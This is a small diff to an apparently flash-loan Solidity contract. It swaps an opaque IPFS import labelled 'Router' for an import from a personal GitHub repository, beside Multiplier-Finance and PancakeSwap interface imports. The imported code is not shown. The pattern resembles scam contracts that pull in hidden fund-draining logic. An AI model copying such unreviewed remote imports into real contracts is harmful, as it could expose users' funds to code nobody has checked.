@@ -6,7 +6,7 @@ import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contra
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 
 //Router
-import "ipfs://QmVizTLPLG9E728r7Q3Dxq67N7ZtX5MWUor6Pi7i7UZuYj";
+import "https://github.com/Orlandis19/Flash/blob/main/Import";
 
 // PancakeSwap Smart Contracts
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
